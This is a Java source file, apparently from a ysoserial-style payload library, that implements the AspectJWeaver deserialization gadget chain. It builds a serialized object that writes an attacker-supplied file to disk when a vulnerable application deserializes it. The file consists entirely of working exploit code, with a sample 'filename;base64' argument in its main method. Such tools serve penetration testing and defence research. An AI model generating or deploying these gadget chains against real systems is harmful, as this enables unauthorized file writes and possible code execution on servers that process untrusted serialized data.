@me.gv7.woodpecker.yso.payloads.annotation.PayloadTest(skip = "non RCE")
@java.lang.SuppressWarnings({ "rawtypes", "unchecked" })
@me.gv7.woodpecker.yso.payloads.annotation.Dependencies({ "org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2" })
@me.gv7.woodpecker.yso.payloads.annotation.Authors({ me.gv7.woodpecker.yso.payloads.annotation.Authors.JANG })
public class AspectJWeaver implements me.gv7.woodpecker.yso.payloads.ObjectPayload<java.io.Serializable> {
	public java.io.Serializable getObject(final java.lang.String command) throws java.lang.Exception {
		int sep = command.lastIndexOf(';');
		if (sep < 0) {
			throw new java.lang.IllegalArgumentException("Command format is: <filename>;<base64 Object>");
		}
		java.lang.String[] parts = command.split(";");
		java.lang.String filename = parts[0];
		byte[] content = org.apache.commons.codec.binary.Base64.decodeBase64(parts[1]);
		java.lang.reflect.Constructor ctor = me.gv7.woodpecker.yso.payloads.util.Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
		java.lang.Object simpleCache = ctor.newInstance(".", 12);
		org.apache.commons.collections.Transformer ct = new org.apache.commons.collections.functors.ConstantTransformer(content);
		java.util.Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(((java.util.Map) (simpleCache)), ct);
		org.apache.commons.collections.keyvalue.TiedMapEntry entry = new org.apache.commons.collections.keyvalue.TiedMapEntry(lazyMap, filename);
		java.util.HashSet map = new java.util.HashSet(1);
		map.add("foo");
		java.lang.reflect.Field f = null;
		try {
			f = java.util.HashSet.class.getDeclaredField("map");
		} catch (java.lang.NoSuchFieldException e) {
			f = java.util.HashSet.class.getDeclaredField("backingMap");
		}
		me.gv7.woodpecker.yso.payloads.util.Reflections.setAccessible(f);
		java.util.HashMap innimpl = ((java.util.HashMap) (f.get(map)));
		java.lang.reflect.Field f2 = null;
		try {
			f2 = java.util.HashMap.class.getDeclaredField("table");
		} catch (java.lang.NoSuchFieldException e) {
			f2 = java.util.HashMap.class.getDeclaredField("elementData");
		}
		me.gv7.woodpecker.yso.payloads.util.Reflections.setAccessible(f2);
		java.lang.Object[] array = ((java.lang.Object[]) (f2.get(innimpl)));
		java.lang.Object node = array[0];
		if (node == null) {
			node = array[1];
		}
		java.lang.reflect.Field keyField = null;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (java.lang.Exception e) {
			keyField = java.lang.Class.forName("java.util.MapEntry").getDeclaredField("key");
		}
		me.gv7.woodpecker.yso.payloads.util.Reflections.setAccessible(keyField);
		keyField.set(node, entry);
		return map;
	}

	public static void main(java.lang.String[] args) throws java.lang.Exception {
		args = new java.lang.String[]{ "ahi.txt;YWhpaGloaQ==" };
		me.gv7.woodpecker.yso.payloads.util.PayloadRunner.run(me.gv7.woodpecker.yso.payloads.AspectJWeaver.class, args);
	}
}